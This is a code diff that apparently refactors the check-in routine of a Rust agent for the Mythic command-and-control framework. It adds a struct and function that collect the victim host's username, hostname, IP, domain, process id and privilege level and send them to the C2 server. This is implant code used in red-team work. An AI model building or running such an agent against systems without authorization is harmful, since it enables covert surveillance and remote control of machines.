@@ -1,18 +1,16 @@
-use crate::payloadvars;
-use crate::tasking::Tasker;
+use std::error::Error;
+
 use chrono::prelude::{DateTime, NaiveDate};
 use chrono::{Duration, Local, NaiveDateTime, NaiveTime};
 use serde::{Deserialize, Serialize};
 use serde_json::json;
-use std::error::Error;
 
-use crate::profiles::Profile;
-
-#[cfg(target_os = "linux")]
-use crate::utils::linux as native;
-
-#[cfg(target_os = "windows")]
-use crate::utils::windows as native;
+use crate::{
+    payloadvars,
+    profiles::Profile,
+    tasking::Tasker,
+    utils::platform::{self, IntegrityLevel},
+};
 
 /// Struct containing the pending task information
 #[derive(Debug, Deserialize, Serialize)]
@@ -90,6 +88,45 @@ pub struct SharedData {
     pub working_end: NaiveTime,
 }
 
+/// Checkin info for Mythic initial check in
+#[derive(Serialize)]
+struct CheckinInfo {
+    /// Action (checkin)
+    action: String,
+
+    /// Mythic UUID
+    uuid: String,
+
+    /// Current process id
+    pid: u32,
+
+    /// Agent architecture
+    architecture: String,
+
+    /// OS information
+    os: String,
+
+    /// Internal IP addresses
+    #[serde(skip_serializing_if = "Vec::is_empty")]
+    ips: Vec<String>,
+
+    /// User name
+    #[serde(skip_serializing_if = "Option::is_none")]
+    user: Option<String>,
+
+    /// Host name
+    #[serde(skip_serializing_if = "Option::is_none")]
+    host: Option<String>,
+
+    /// Agent integrity level
+    #[serde(skip_serializing_if = "Option::is_none")]
+    integrity_level: Option<IntegrityLevel>,
+
+    /// Machine domain name
+    #[serde(skip_serializing_if = "Option::is_none")]
+    domain: Option<String>,
+}
+
 /// Main agent struct containing information with regards to C2 communication
 pub struct Agent {
     /// Data shared between the agent and worker threads
@@ -128,7 +165,7 @@ impl Agent {
     /// Makes the inital C2 checkin
     pub fn make_checkin(&mut self) -> Result<(), Box<dyn Error>> {
         // Get the checkin information depending on OS
-        let json_body = native::get_checkin_info();
+        let json_body = serde_json::to_string(&checkin_info()).unwrap();
 
         // Send the checkin information through the configured profile
         self.c2profile.initial_checkin(&json_body)?;
@@ -269,5 +306,22 @@ pub fn calculate_sleep_time(interval: u64, jitter: u64) -> u64 {
         interval + (interval as f64 * jitter) as u64
     } else {
         interval - (interval as f64 * jitter) as u64
+    }
+}
+
+fn checkin_info() -> CheckinInfo {
+    CheckinInfo {
+        action: "checkin".to_string(),
+        ips: platform::local_ipaddress()
+            .map(|ip| vec![ip])
+            .unwrap_or_default(),
+        os: platform::detailed_name().unwrap_or_else(|_| platform::generic_name()),
+        user: platform::username().ok(),
+        host: platform::hostname().ok(),
+        pid: std::process::id(),
+        uuid: payloadvars::payload_uuid(),
+        architecture: std::env::consts::ARCH.to_string(),
+        integrity_level: platform::integrity_level().ok(),
+        domain: platform::domain().ok(),
     }
 }
